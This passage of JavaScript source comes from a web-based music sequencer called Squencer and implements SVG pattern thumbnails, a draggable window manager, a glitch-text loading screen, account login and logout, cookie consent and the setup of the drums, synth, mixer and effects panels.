	update( id, buf ) {
		const polygon = gsuiSVGDefs.create( "polygon" ),
			w = this._optResolution === Infinity ? 260 : buf.duration * 48 | 0,
			h = 48;

		gsuiWaveform.drawBuffer( polygon, w, h, buf );
		return super.update( id, w, h, polygon );
	}
	setSVGViewbox( svg, x, w, bps ) {
		if ( this._optResolution === Infinity ) {
			return super.setSVGViewbox( svg, x * 260, w * 260 );
		}
		return super.setSVGViewbox( svg, x / bps * 48, w / bps * 48 );
	}
}

class gsuiKeysforms extends gsuiSVGDefs {
	update( id, keys, dur ) {
		return super.update( id, dur, 1, ...gsuiKeysforms._render( keys ) );
	}

	static _render( keys ) {
		const arrKeys = Object.values( keys ),
			{ min, size } = gsuiKeysforms._calcMinMax( arrKeys ),
			rowH = 1 / ( size + 1 );

		return arrKeys.map( k => {
			const rect = gsuiSVGDefs.create( "rect" );

			rect.setAttribute( "x", k.when );
			rect.setAttribute( "y", ( size - k.key + min ) * rowH );
			rect.setAttribute( "width", k.duration );
			rect.setAttribute( "height", rowH );
			return rect;
		}, [] );
	}
	static _calcMinMax( arrKeys ) {
		let min = Infinity,
			max = -Infinity;

		arrKeys.forEach( k => {
			min = Math.min( min, k.key );
			max = Math.max( max, k.key );
		} );
		min -= min % 12;
		max += 11 - max % 12;
		return { min, size: max - min };
	}
}

class gsuiDrumsforms extends gsuiSVGDefs {
	update( id, drums, drumrows, dur, stepsPerBeat ) {
		return super.update( id, dur, 1, ...gsuiDrumsforms._render( drums, drumrows, stepsPerBeat ) );
	}

	static _render( drums, drumrows, sPB ) {
		const rowsArr = Object.entries( drumrows ),
			drmW = 1 / sPB,
			drmH = 1 / rowsArr.length,
			orders = rowsArr
				.sort( ( a, b ) => a[ 1 ].order - b[ 1 ].order )
				.reduce( ( obj, [ id ], i ) => {
					obj[ id ] = i;
					return obj;
				}, {} );

		return Object.values( drums )
			.map( d => gsuiDrumsforms._createDrum( d.when, orders[ d.row ], drmW, drmH ), [] );
	}
	static _createDrum( x, y, w, h ) {
		const pol = gsuiSVGDefs.create( "polygon" ),
			yy = y * h,
			mg = h / 7;

		pol.setAttribute( "points", `
			${ x },${ yy + mg }
			${ x },${ yy + h - mg }
			${ x + w },${ yy + h / 2 }
		` );
		return pol;
	}
}

class gsuiWindows {
	constructor() {
		this._arrWindows = [];
		this._objWindows = {};
		this._nbWindowsMaximized = 0;
		this._lowGraphics = false;
		this.onopen =
		this.onclose =
		this._mouseFnUp =
		this._mouseFnMove =
		this.focusedWindow = null;
		this.setRootElement( document.body );
		Object.seal( this );
	}

	resized() {
		this._arrWindows.forEach( win => {
			if ( win._maximized ) {
				win._callOnresize();
			}
		} );
	}
	lowGraphics( b ) {
		this._lowGraphics = b;
		this.rootElement.classList.toggle( "gsuiWindows-lowGraphics", b );
	}
	setRootElement( el ) {
		if ( el !== this.rootElement ) {
			this._detach();
			this._attachTo( el );
			this._arrWindows.forEach( win => win._attachTo( el ) );
		}
	}
	createWindow( id ) {
		const win = new gsuiWindow( this, id );

		this._arrWindows.push( win );
		this._objWindows[ id ] = win;
		win._attachTo( this.rootElement );
		win.movable( true );
		return win;
	}
	window( winId ) {
		return this._objWindows[ winId ];
	}

	// private and share with gsuiWindow:
	// .........................................................................
	_startMousemoving( cursor, fnMove, fnUp ) {
		window.getSelection().removeAllRanges();
		this._mouseFnUp = this._stopMousemoving.bind( this, fnUp );
		this._mouseFnMove = fnMove;
		document.addEventListener( "mouseup", this._mouseFnUp );
		document.addEventListener( "mousemove", fnMove );
		GSUI.dragshield.show( cursor );
	}
	_stopMousemoving( fnUp, e ) {
		document.removeEventListener( "mouseup", this._mouseFnUp );
		document.removeEventListener( "mousemove", this._mouseFnMove );
		GSUI.dragshield.hide();
		this._mouseFnUp =
		this._mouseFnMove = null;
		fnUp( e );
	}

	// private:
	// .........................................................................
	_detach() {
		const el = this.rootElement;

		if ( el ) {
			el.classList.remove( "gsuiWindows", "gsuiWindows-lowGraphics" );
		}
	}
	_attachTo( el ) {
		this.rootElement = el;
		el.classList.add( "gsuiWindows" );
		el.classList.toggle( "gsuiWindows-lowGraphics", this._lowGraphics );
	}
	_open( win ) {
		win.focus();
		if ( this.onopen ) {
			this.onopen( win );
		}
	}
	_close( win ) {
		if ( win === this.focusedWindow ) {
			this.focusedWindow = null;
		}
		if ( this.onclose ) {
			this.onclose( win );
		}
	}
	_onfocusinWin( win, e ) {
		if ( win !== this.focusedWindow ) {
			const z = win.zIndex;

			clearTimeout( win._focusoutTimeoutId );
			this._arrWindows.forEach( win => {
				if ( win.zIndex > z ) {
					win._setZIndex( win.zIndex - 1 );
				}
			} );
			win._setZIndex( this._arrWindows.length - 1 );
			this.focusedWindow = win;
		}
		if ( win.onfocusin ) {
			win.onfocusin( e );
		}
	}
	_winMaximized( _winId ) {
		++this._nbWindowsMaximized;
		this.rootElement.classList.add( "gsuiWindows-maximized" );
		this.rootElement.scrollTop =
		this.rootElement.scrollLeft = 0;
	}
	_winRestored( _winId ) {
		if ( --this._nbWindowsMaximized === 0 ) {
			this.rootElement.classList.remove( "gsuiWindows-maximized" );
		}
	}
}

Object.freeze( gsuiWindows );

GSUI.setTemplate( "gsui-window", () => (
	GSUI.createElement( "div", { class: "gsuiWindow", tabindex: 0 },
		GSUI.createElement( "div", { class: "gsuiWindow-handlers" },
			GSUI.createElement( "div", { class: "gsuiWindow-handler", "data-dir": "n" } ),
			GSUI.createElement( "div", { class: "gsuiWindow-handler", "data-dir": "e" } ),
			GSUI.createElement( "div", { class: "gsuiWindow-handler", "data-dir": "s" } ),
			GSUI.createElement( "div", { class: "gsuiWindow-handler", "data-dir": "w" } ),
			GSUI.createElement( "div", { class: "gsuiWindow-handler", "data-dir": "nw" } ),
			GSUI.createElement( "div", { class: "gsuiWindow-handler", "data-dir": "ne" } ),
			GSUI.createElement( "div", { class: "gsuiWindow-handler", "data-dir": "sw" } ),
			GSUI.createElement( "div", { class: "gsuiWindow-handler", "data-dir": "se" } ),
		),
		GSUI.createElement( "div", { class: "gsuiWindow-wrap" },
			GSUI.createElement( "div", { class: "gsuiWindow-head" },
				GSUI.createElement( "button", { class: "gsuiWindow-icon gsuiIcon", tabindex: -1 } ),
				GSUI.createElement( "div", { class: "gsuiWindow-title" } ),
				GSUI.createElement( "div", { class: "gsuiWindow-headContent" } ),
				GSUI.createElement( "div", { class: "gsuiWindow-headBtns" },
					GSUI.createElement( "button", { class: "gsuiWindow-headBtn gsuiIcon", "data-icon": "minimize", title: "Minimize" } ),
					GSUI.createElement( "button", { class: "gsuiWindow-headBtn gsuiIcon", "data-icon": "restore", title: "Restore" } ),
					GSUI.createElement( "button", { class: "gsuiWindow-headBtn gsuiIcon", "data-icon": "maximize", title: "Maximize" } ),
					GSUI.createElement( "button", { class: "gsuiWindow-headBtn gsuiIcon", "data-icon": "close", title: "Close" } ),
				),
			),
			GSUI.createElement( "div", { class: "gsuiWindow-content" } ),
		),
	)
) );

class gsuiWindow {
	constructor( parent, id ) {
		const root = GSUI.getTemplate( "gsui-window" );

		this.id = id;
		this.parent = parent;
		this.rootElement = root;
		this._elWrap = this._getElem( "wrap" );
		this._elHandlers = this._getElem( "handlers" );
		this._show =
		this._minimized =
		this._maximized = false;
		this.zIndex = 0;
		this.onresize =
		this.onfocusin =
		this.onresizing = null;
		this.rect = Object.seal( { x: 0, y: 0, w: 32, h: 32 } );
		this._restoreRect = Object.seal( { x: 0, y: 0, w: 32, h: 32 } );
		this._magnetPos = Object.seal( { x: 0, y: 0 } );
		this._mousemovePos = Object.seal( { x: 0, y: 0 } );
		this._mousedownPos = Object.seal( { x: 0, y: 0 } );
		this._mousedownHeadHeight = 0;
		this._wMin =
		this._hMin = 32;
		Object.seal( this );

		root.dataset.windowId = id;
		root.addEventListener( "focusin", parent._onfocusinWin.bind( parent, this ) );
		this._getElem( "icon" ).ondblclick = this.close.bind( this );
		this._getElem( "headBtns" ).onclick = this._onclickBtns.bind( this );
		this._getElem( "head" ).onmousedown = this._onmousedownHead.bind( this );
		this._getElem( "title" ).ondblclick =
		this._getElem( "headContent" ).ondblclick = this._ondblclickTitle.bind( this );
		this._elHandlers.onmousedown = this._onmousedownHandlers.bind( this );
		this._setZIndex( 0 );
		this.setTitle( id );
		this.setPosition( 0, 0 );
		this.setSize( 300, 150 );
	}

	open() { return this.openToggle( true ); }
	close() { return this.openToggle( false ); }
	openToggle( b ) {
		if ( b !== this._show ) {
			if ( b ) {
				this._show = true;
				this._setClass( "show", true );
				this.parent._open( this );
			} else if ( !this.onclose || this.onclose() !== false ) {
				this._show = false;
				this._setClass( "show", false );
				this.parent._close( this );
			}
		}
	}

	setIdAttr( id ) {
		this.rootElement.id = id;
	}
	setTitleIcon( icon ) {
		this._getElem( "icon" ).dataset.icon = icon;
	}
	empty() {
		const cnt = this._getElem( "content" ),
			headCnt = this._getElem( "headContent" );

		while ( cnt.lastChild ) {
			cnt.lastChild.remove();
		}
		while ( headCnt.lastChild ) {
			headCnt.lastChild.remove();
		}
	}
	append( ...args ) {
		this._getElem( "content" ).append( ...args );
	}
	headAppend( ...args ) {
		this._getElem( "headContent" ).append( ...args );
	}

	focus() {
		const root = this.rootElement;

		if ( !root.contains( document.activeElement ) ) {
			setTimeout( root.focus.bind( root ), 50 );
		}
	}
	maximize() {
		if ( !this._maximized ) {
			const st = this.rootElement.style;

			this._restoreRect.x = this.rect.x;
			this._restoreRect.y = this.rect.y;
			this._restoreRect.w = this.rect.w;
			if ( !this._minimized ) {
				this._restoreRect.h = this.rect.h;
			}
			st.top = st.left = st.right = st.bottom = st.width = st.height = "";
			this._setClass( "maximized", true );
			this._setClass( "minimized", false );
			this._maximized = true;
			this._minimized = false;
			this._callOnresize();
			this.focus();
			this.parent._winMaximized( this.id );
		}
	}
	minimize() {
		if ( !this._minimized ) {
			const rcRestore = this._restoreRect;

			if ( !this._maximized ) {
				Object.assign( rcRestore, this.rect );
			}
			this._setClass( "minimized", true );
			this._setClass( "maximized", false );
			this._minimized = true;
			this._maximized = false;
			this.setSize( rcRestore.w, this._getHeadHeight(), "nocallback" );
			this.setPosition( rcRestore.x, rcRestore.y );
			this.parent._winRestored( this.id );
		}
	}
	restore() {
		if ( this._minimized || this._maximized ) {
			const rcRestore = this._restoreRect;

			this.focus();
			this._setClass( "minimized", false );
			this._setClass( "maximized", false );
			this._minimized =
			this._maximized = false;
			this.setSize( rcRestore.w, rcRestore.h );
			this.setPosition( rcRestore.x, rcRestore.y );
			this.parent._winRestored( this.id );
		}
	}

	movable( b ) {
		this._setClass( "movable", b );
	}
	setTitle( t ) {
		this._getElem( "title" ).textContent = t;
	}
	setSize( w, h, nocb ) {
		this.rect.w = w;
		this.rect.h = h;
		this.rootElement.style.width = `${ w }px`;
		this.rootElement.style.height = `${ h }px`;
		if ( nocb !== "nocallback" ) {
			this._callOnresize();
		}
	}
	setMinSize( w, h ) {
		this._wMin = w;
		this._hMin = h;
	}
	setPosition( x, y ) {
		this.rect.x = x;
		this.rect.y = y;
		this.rootElement.style.left = `${ x }px`;
		this.rootElement.style.top = `${ y }px`;
	}

	// events:
	_onclickBtns( e ) {
		const act = e.target.dataset.icon;

		if ( act ) {
			this[ act ]();
		}
	}
	_ondblclickTitle( e ) {
		if ( e.target === e.currentTarget ) {
			this._maximized
				? this.restore()
				: this.maximize();
		}
	}
	_onmousedownHead( e ) {
		const clTar = e.target.classList,
			clicked =
				clTar.contains( "gsuiWindow-head" ) ||
				clTar.contains( "gsuiWindow-title" ) ||
				clTar.contains( "gsuiWindow-headContent" );

		if ( clicked && !this._maximized ) {
			this._mousedownPos.x = e.clientX;
			this._mousedownPos.y = e.clientY;
			this._mousemovePos.x =
			this._mousemovePos.y = 0;
			this._setClass( "dragging", true );
			this.parent._startMousemoving( "move",
				this._onmousemoveHead.bind( this ),
				this._onmouseupHead.bind( this ) );
		}
	}
	_onmousedownHandlers( e ) {
		const dir = e.target.dataset.dir;

		if ( dir ) {
			this._mousedownPos.x = e.clientX;
			this._mousedownPos.y = e.clientY;
			this._mousemovePos.x =
			this._mousemovePos.y = 0;
			this._mousedownHeadHeight = this._getHeadHeight();
			this._setClass( "dragging", true );
			this.parent._startMousemoving( `${ dir }-resize`,
				this._onmousemoveHandler.bind( this, dir ),
				this._onmouseupHandler.bind( this, dir ) );
		}
	}
	_onmousemoveHead( e ) {
		const x = e.clientX - this._mousedownPos.x,
			y = e.clientY - this._mousedownPos.y,
			mmPos = this._mousemovePos,
			magnet = this._calcCSSmagnet( "nesw", x, y );

		mmPos.x = x + magnet.x;
		mmPos.y = y + magnet.y;
		this._setCSSrelativeMove( this._elHandlers.style, mmPos.x, mmPos.y );
		if ( !this.parent._lowGraphics ) {
			this._setCSSrelativeMove( this._elWrap.style, mmPos.x, mmPos.y );
		}
	}
	_onmouseupHead() {
		const { x, y } = this.rect,
			m = this._mousemovePos;

		this._setClass( "dragging", false );
		this._resetCSSrelative( this._elWrap.style );
		this._resetCSSrelative( this._elHandlers.style );
		if ( m.x || m.y ) {
			this.setPosition( x + m.x, y + m.y );
			this._restoreRect.x = this.rect.x;
			this._restoreRect.y = this.rect.y;
		}
	}
	_onmousemoveHandler( dir, e ) {
		const fnResize = this.onresizing,
			x = e.clientX - this._mousedownPos.x,
			y = e.clientY - this._mousedownPos.y,
			mmPos = this._mousemovePos,
			magnet = this._calcCSSmagnet( dir, x, y );

		mmPos.x = x + magnet.x;
		mmPos.y = y + magnet.y;
		this._calcCSSrelativeResize( dir, mmPos );
		this._setCSSrelativeResize( this._elHandlers.style, dir, mmPos );
		if ( !this.parent._lowGraphics ) {
			this._setCSSrelativeResize( this._elWrap.style, dir, mmPos );
			if ( fnResize ) {
				const w = this.rect.w,
					h = this.rect.h - this._mousedownHeadHeight;

				switch ( dir ) {
					case "n":  fnResize( w,     h - y ); break;
					case "w":  fnResize( w - x, h     ); break;
					case "e":  fnResize( w + x, h     ); break;
					case "s":  fnResize( w,     h + y ); break;
					case "nw": fnResize( w - x, h - y ); break;
					case "ne": fnResize( w + x, h - y ); break;
					case "sw": fnResize( w - x, h + y ); break;
					case "se": fnResize( w + x, h + y ); break;
				}
			}
		}
	}
	_onmouseupHandler( dir ) {
		const { x, y, w, h } = this.rect,
			m = this._mousemovePos;

		this._setClass( "dragging", false );
		this._resetCSSrelative( this._elWrap.style );
		this._resetCSSrelative( this._elHandlers.style );
		if ( m.x || m.y ) {
			switch ( dir ) {
				case "e" : this.setSize( w + m.x, h       ); break;
				case "se": this.setSize( w + m.x, h + m.y ); break;
				case "s" : this.setSize( w,       h + m.y ); break;
				case "sw": this.setSize( w - m.x, h + m.y ); this.setPosition( x + m.x, y       ); break;
				case "w" : this.setSize( w - m.x, h       ); this.setPosition( x + m.x, y       ); break;
				case "nw": this.setSize( w - m.x, h - m.y ); this.setPosition( x + m.x, y + m.y ); break;
				case "n" : this.setSize( w,       h - m.y ); this.setPosition( x,       y + m.y ); break;
				case "ne": this.setSize( w + m.x, h - m.y ); this.setPosition( x,       y + m.y ); break;
			}
		}
	}

	// private:
	_getElem( c ) {
		return this.rootElement.querySelector( `.gsuiWindow-${ c }` );
	}
	_attachTo( parentElem ) {
		parentElem.append( this.rootElement );
	}
	_setClass( clazz, b ) {
		this.rootElement.classList.toggle( `gsuiWindow-${ clazz }`, b );
	}
	_setZIndex( z ) {
		this.zIndex =
		this.rootElement.style.zIndex = z;
	}
	_callOnresize() {
		if ( this.onresize ) {
			const bcr = this._getElem( "content" ).getBoundingClientRect();

			this.onresize( bcr.width, bcr.height );
		}
	}
	_getHeadHeight() {
		return this._getElem( "head" ).getBoundingClientRect().height;
	}
	_calcCSSmagnet( dir, x, y ) {
		const rc = this.rect,
			dirW = dir.includes( "w" ),
			dirN = dir.includes( "n" ),
			dirE = dir.includes( "e" ),
			dirS = dir.includes( "s" ),
			tx = dirW ? rc.x + x : rc.x,
			ty = dirN ? rc.y + y : rc.y,
			parBCR = this.parent.rootElement.getBoundingClientRect(),
			wins = [
				...this.parent._arrWindows,
				{ _show: true, rect: { x: 0, y: 0, w: parBCR.width - 4, h: parBCR.height - 4 } }
			];
		let mgX = 0,
			mgY = 0;

		if ( dirE && dirW ) {
			const mgXa = this._findClosestWin( wins, "x", tx + rc.w, 2, 0 ),
				mgXb = this._findClosestWin( wins, "x", tx, 0, 2 );

			if ( mgXa || mgXb ) {
				mgX = Math.abs( mgXa || Infinity ) < Math.abs( mgXb || Infinity ) ? mgXa : mgXb;
			}
		} else if ( dirE ) {
			mgX = this._findClosestWin( wins, "x", tx + rc.w + x, 2, 0 );
		} else {
			mgX = this._findClosestWin( wins, "x", tx, 0, 2 );
		}
		if ( dirS && dirN ) {
			const mgYa = this._findClosestWin( wins, "y", ty + rc.h, 2, 0 ),
				mgYb = this._findClosestWin( wins, "y", ty, 0, 2 );

			if ( mgYa || mgYb ) {
				mgY = Math.abs( mgYa || Infinity ) < Math.abs( mgYb || Infinity ) ? mgYa : mgYb;
			}
		} else if ( dirS ) {
			mgY = this._findClosestWin( wins, "y", ty + rc.h + y, 2, 0 );
		} else {
			mgY = this._findClosestWin( wins, "y", ty, 0, 2 );
		}
		return { x: mgX, y: mgY };
	}
	_findClosestWin( wins, dir, value, brdL, brdR ) {
		let vAbsMin = Infinity;

		return wins.reduce( ( vMin, win ) => {
			if ( win._show && win.id !== this.id ) {
				const wrc = win.rect,
					wrcDir = wrc[ dir ],
					v1 = wrcDir - brdL - value,
					v2 = wrcDir + ( dir === "x" ? wrc.w : wrc.h ) + brdR - value,
					v1Abs = Math.abs( v1 ),
					v2Abs = Math.abs( v2 ),
					abs = Math.min( v1Abs, v2Abs );

				if ( abs < 4 && abs < vAbsMin ) {
					vAbsMin = abs;
					return v1Abs < v2Abs ? v1 : v2;
				}
			}
			return vMin;
		}, 0 );
	}
	_resetCSSrelative( st ) {
		st.top =
		st.left =
		st.right =
		st.bottom = 0;
	}
	_setCSSrelativeMove( st, x, y ) {
		st.top    = `${  y }px`;
		st.left   = `${  x }px`;
		st.right  = `${ -x }px`;
		st.bottom = `${ -y }px`;
	}
	_calcCSSrelativeResize( dir, mm ) {
		const w = this.rect.w - this._wMin,
			h = this.rect.h - this._mousedownHeadHeight - this._hMin;

		switch ( dir ) {
			case "n" : if ( h - mm.y < 0 ) { mm.y =  h; } break;
			case "s" : if ( h + mm.y < 0 ) { mm.y = -h; } break;
			case "w" :                                    if ( w - mm.x < 0 ) { mm.x =  w; } break;
			case "e" :                                    if ( w + mm.x < 0 ) { mm.x = -w; } break;
			case "nw": if ( h - mm.y < 0 ) { mm.y =  h; } if ( w - mm.x < 0 ) { mm.x =  w; } break;
			case "ne": if ( h - mm.y < 0 ) { mm.y =  h; } if ( w + mm.x < 0 ) { mm.x = -w; } break;
			case "sw": if ( h + mm.y < 0 ) { mm.y = -h; } if ( w - mm.x < 0 ) { mm.x =  w; } break;
			case "se": if ( h + mm.y < 0 ) { mm.y = -h; } if ( w + mm.x < 0 ) { mm.x = -w; } break;
		}
	}
	_setCSSrelativeResize( st, dir, mm ) {
		switch ( dir ) {
			case "n" : st.top    = `${  mm.y }px`; break;
			case "s" : st.bottom = `${ -mm.y }px`; break;
			case "w" : st.left   = `${  mm.x }px`; break;
			case "e" : st.right  = `${ -mm.x }px`; break;
			case "nw": st.left   = `${  mm.x }px`; st.top    = `${  mm.y }px`; break;
			case "ne": st.right  = `${ -mm.x }px`; st.top    = `${  mm.y }px`; break;
			case "sw": st.left   = `${  mm.x }px`; st.bottom = `${ -mm.y }px`; break;
			case "se": st.right  = `${ -mm.x }px`; st.bottom = `${ -mm.y }px`; break;
		}
	}
}

Object.freeze( gsuiWindow );

function UIdomInit() {
	window.DOM = UIdomFill();
	UIdomGetComments().forEach( com => {
		com.replaceWith( DOM[ com.textContent.substr( 1 ) ] );
	} );
}

function UIdomFill() {
	const DOM = UIdomFillIds(),
		winBtns = DOM.winBtns.querySelectorAll( ".winBtn" );

	DOM.winBtnsMap = Array.prototype.reduce.call( winBtns, ( map, btn ) => {
		map.set( btn.dataset.win, btn );
		return map;
	}, new Map() );
	return DOM;
}

function UIdomFillIds() {
	const ids = document.querySelectorAll( "[id]" );

	return Array.prototype.reduce.call( ids, ( obj, el ) => {
		obj[ el.id ] = el;
		if ( "remove" in el.dataset ) {
			el.remove();
			el.removeAttribute( "data-remove" );
		}
		if ( "removeId" in el.dataset ) {
			el.removeAttribute( "id" );
			el.removeAttribute( "data-remove-id" );
		}
		return obj;
	}, {} );
}

function UIdomGetComments() {
	const list = [],
		treeWalker = document.createTreeWalker(
			document.body,
			NodeFilter.SHOW_COMMENT,
			{ acceptNode: com => com.textContent[ 0 ] === "#"
				? NodeFilter.FILTER_ACCEPT
				: NodeFilter.FILTER_REJECT
			},
			false
		);

	while ( treeWalker.nextNode() ) {
		list.push( treeWalker.currentNode );
	}
	return list;
}

class TextGlitch {
	constructor( root ) {
		this._root = root;
		this._elClips = root.querySelectorAll( ".TextGlitch-clip" );
		this._elWords = root.querySelectorAll( ".TextGlitch-word" );
		this._frame = this._frame.bind( this );
		this._unglitch = this._unglitch.bind( this );
		this._frameId = null;
		this._text = "";
		this._textAlt = [];
		Object.seal( this );

		this.setTexts( [
			"Squencer",
			"DigitalSQUENceR",
			"&<:]$+\\#)",
			"6/1)20^?}",
			"9-!>5?nu]",
		] );
	}

	on() {
		if ( !this._frameId ) {
			this._frame();
		}
	}
	off() {
		clearTimeout( this._frameId );
		this._frameId = null;
		this._unglitch();
	}
	setTexts( [ text, ...alt ] ) {
		this._text = text;
		this._textAlt = alt;
	}

	// private:
	_frame() {
		this._glitch();
		setTimeout( this._unglitch, 50 + Math.random() * 200 );
		this._frameId = setTimeout( this._frame, 250 + Math.random() * 800 );
	}
	_glitch() {
		const clip1 = this._randDouble( .2 ),
			clip2 = this._randDouble( .2 );

		this._elClips.forEach( el => {
			const x = this._randDouble( .25 ),
				y = this._randDouble( .05 );

			el.style.transform = `translate(${ x }em, ${ y }em)`;
		} );
		this._elClips[ 0 ].style.clipPath = `inset( 0 0 ${ .6 + clip1 }em 0 )`;
		this._elClips[ 1 ].style.clipPath = `inset( ${ .4 - clip1 }em 0 ${ .3 - clip2 }em 0 )`;
		this._elClips[ 2 ].style.clipPath = `inset( ${ .7 + clip2 }em 0 0 0 )`;
		this._textContent( this._randText() );
		this._root.classList.add( "TextGlitch-blended" );
	}
	_unglitch() {
		this._elClips.forEach( el => {
			el.style.clipPath =
			el.style.transform = "";
		} );
		this._textContent( this._text );
		this._root.classList.remove( "TextGlitch-blended" );
	}

	_randText() {
		const txt = Array.from( this._text );

		for ( let i = 0; i < 5; ++i ) {
			const ind = this._randInt( this._text.length );

			txt[ ind ] = this._textAlt[ this._randInt( this._textAlt.length ) ][ ind ];
		}
		return txt.join( "" );
	}
	_randDouble( d ) {
		return Math.random() * d - d / 2;
	}
	_randInt( n ) {
		return Math.random() * n | 0;
	}
	_textContent( txt ) {
		this._elWords.forEach( el => el.textContent = txt );
	}
}

function UIloading() {
	return new Promise( resolve => {
		const el = document.querySelector( "#loading" ),
			elTitle = document.querySelector( "#gsTitle" ),
			glitch = new TextGlitch( elTitle );

		el.classList.add( "loaded" );
		if ( window.CSS && CSS.supports( "clip-path: inset(0 1px 2px 3px)" ) ) {
			glitch.on();
		}
		el.onclick = () => {
			glitch.off();
			el.classList.add( "starting" );
			setTimeout( resolve, 100 );
		};
	} );
}

function UIloaded() {
	const el = document.querySelector( "#loading" );

	el.classList.add( "started" );
	setTimeout( () => el.remove(), 800 );
}

function UIauthInit() {
	DOM.login.onclick = UIauthLogin;
	DOM.logout.onclick = UIauthLogout;
}

function UIauthLoading( b ) {
	DOM.login.dataset.spin =
	DOM.logout.dataset.spin = b ? "on" : "";
}

function UIauthLogout() {
	UIauthLoading( true );
	gsapiClient.logout()
		.finally( () => UIauthLoading( false ) )
		.then( UIauthLogoutThen );
}

function UIauthGetMe() {
	UIauthLoading( true );
	return gsapiClient.getMe()
		.then( me => {
			UIauthLoginThen( me );
			return gsapiClient.getUserCompositions( me.id );
		} )
		.then( cmps => {
			const opt = { saveMode: "cloud" };

			cmps.forEach( cmp => DAW.addComposition( cmp.data, opt ) );
		} )
		.catch( res => {
			if ( res.code !== 401 ) {
				throw res;
			}
		} )
		.finally( () => UIauthLoading( false ) );
}

function UIauthLogin() {
	if ( !gsapiClient.user.id ) {
		gsuiPopup.custom( {
			ok: "Sign in",
			title: "Authentication",
			submit: UIauthLoginSubmit,
			element: DOM.authPopupContent,
		} ).then( () => {
			DOM.authPopupContent.querySelectorAll( "input" )
				.forEach( inp => inp.value = "" );
		} );
		return false;
	}
}

function UIauthLoginSubmit( obj ) {
	UIauthLoading( true );
	DOM.authPopupError.textContent = "";
	return gsapiClient.login( obj.email, obj.password )
		.then( me => {
			UIauthLoginThen( me );
			return gsapiClient.getUserCompositions( me.id );
		} )
		.then( cmps => {
			const opt = { saveMode: "cloud" };

			cmps.forEach( cmp => DAW.addComposition( cmp.data, opt ) );
		} )
		.catch( res => {
			DOM.authPopupError.textContent = res.msg;
			throw res;
		} )
		.finally( () => UIauthLoading( false ) );
}

function UIauthLoginThen( me ) {
	DOM.app.classList.add( "logged" );
	DOM.headUser.href = `https://squencer.netlify.app/#/u/${ me.username }`;
	DOM.headUser.style.backgroundImage = `url("${ me.avatar }")`;
	return me;
}

function UIauthLogoutThen() {
	DOM.app.classList.remove( "logged" );
	DOM.headUser.removeAttribute( "href" );
	DOM.headUser.style.backgroundImage = "";
	Array.from( DOM.cmpsCloudList.children )
		.forEach( el => DAW.deleteComposition( "cloud", el.dataset.id ) );
	if ( !DAW.get.cmp() ) {
		UIcompositionClickNewLocal();
	}
}

function UIauthSaveComposition( cmp ) {
	return gsapiClient.saveComposition( cmp )
		.then( () => cmp, err => {
			gsuiPopup.alert( `Error ${ err.code }`,
				"An error happened while saving " +
				"your composition&nbsp;:<br/>" +
				`<code>${ err.msg || err }</code>`
			);
			throw err;
		} );
}

const UIdropCmpExt = {
	gs: true,
	txt: true,
	json: true,
};

function UIdrop( e ) {
	const files = Array.from( e.dataTransfer.files ),
		cmpFile = files.find( f => f.name.split( "." ).pop().toLowerCase() in UIdropCmpExt );

	if ( cmpFile ) {
		DAW.addCompositionByBlob( cmpFile )
			.then( cmp => DAW.openComposition( "local", cmp.id ) );
	}
	return false;
}

function UIdrumsInit() {
	const win = UIwindows.window( "drums" );

	UIdrums.setDAWCore( DAW );
	UIdrums.setPxPerBeat( 120 );
	UIdrums.setWaveforms( UIpatterns.svgForms.bufferHD );
	UIdrums.rootElement.onfocus = () => DAW.drumsFocus();
	DOM.drumsName.onclick = UIdrumsNameClick;
	win.onfocusin = UIdrumsWindowFocusin;
	win.append( UIdrums.rootElement );
}

function UIdrumsWindowFocusin( e ) {
	if ( !UIdrums.rootElement.contains( e.target ) ) {
		UIdrums.rootElement.focus();
	}
}

function UIdrumsNameClick() {
	const id = DAW.get.patternDrumsOpened(),
		name = DOM.drumsName.textContent;

	gsuiPopup.prompt( "Rename pattern", "", name, "Rename" )
		.then( name => DAW.callAction( "renamePattern", id, name ) );
}

function UItitle( cmpName ) {
	const name = cmpName || "Squencer";

	document.title = DAW.compositionNeedSave() ? `*${ name }` : name;
}

function UIsynthInit() {
	UIsynth.setDAWCore( DAW );
	UIsynth.setWaveList( Array.from( gswaPeriodicWaves.list.keys() ) );
	DOM.synthName.onclick = () => {
		const id = DAW.get.synthOpened(),
			name = DOM.synthName.textContent;

		gsuiPopup.prompt( "Rename synthesizer", "", name, "Rename" )
			.then( name => DAW.callAction( "renameSynth", id, name ) );
	};
	UIwindows.window( "synth" ).append( UIsynth.rootElement );
}

function UIsynthChange( obj ) {
	if ( "name" in obj ) {
		DOM.synthName.textContent = obj.name;
	}
	if ( "dest" in obj ) {
		DOM.synthChannelBtnText.textContent = DAW.get.channel( obj.dest ).name;
	}
}

function UImixerInit() {
	const win = UIwindows.window( "mixer" );

	win.append( UImixer.rootElement );
	win.onresize = () => UImixer.resize();
	win.onresizing = () => UImixer.resizing();
	UImixer.attached();
	UImixer.setDAWCore( DAW );
	UImixer.onselectChan = id => UIeffectsSelectChan( id );
}

function UImixerOpenChanPopup( objId ) {
	const currChanId = DAW.get.synth( objId ).dest;

	gsuiPatterns.selectChanPopupSelect.value = currChanId;
	gsuiPopup.custom( {
		title: "Channels",
		element: gsuiPatterns.selectChanPopupContent,
		submit( { channel } ) {
			if ( channel !== currChanId ) {
				DAW.callAction( "redirectSynth", objId, channel );
			}
		}
	} );
}

function UIcookieInit() {
	const cookies = document.cookie;

	if ( cookies.indexOf( "cookieAccepted" ) > -1 ) {
		DOM.cookies.remove();
	} else {
		DOM.cookies.onclick = UIcookieClick;
	}
}

function UIcookieClick() {
	gsuiPopup.confirm(
		"Cookie law",
		"Do you accept to let the Squencer's DAW<br/>"
		+ "using Cookies to offers you two features&nbsp;:<ul>"
		+ "<li>Saving compositions locally (localStorage)</li>"
		+ "<li>Offline mode (serviceWorker)</li>"
		+ "</ul>"
		+ "There are no tracker, analytics or adverts of any<br/>"
		+ "kind on this webapp.",
		"Accept", "Decline"
	).then( b => {
		if ( b ) {
			document.cookie = "cookieAccepted";
			DOM.cookies.remove();
		}
	} );
	return false;
}

function UIeffectsInit() {
	const win = UIwindows.window( "effects" );

	DOM.channelName.onclick = UIeffectsOnclickName;
	win.append( UIeffects.rootElement );
	UIeffects.setDAWCore( DAW );
}

function UIeffectsRenameChan( name ) {
	DOM.channelName.textContent = name;
}

function UIeffectsSelectChan( id ) {
	UIeffectsRenameChan( DAW.get.channel( id ).name );
	UIeffects.setDestFilter( id );
}

function UIeffectsOnclickName() {
	const id = UImixer.getSelectedChannelId();

	if ( id !== "main" ) {
		gsuiPopup
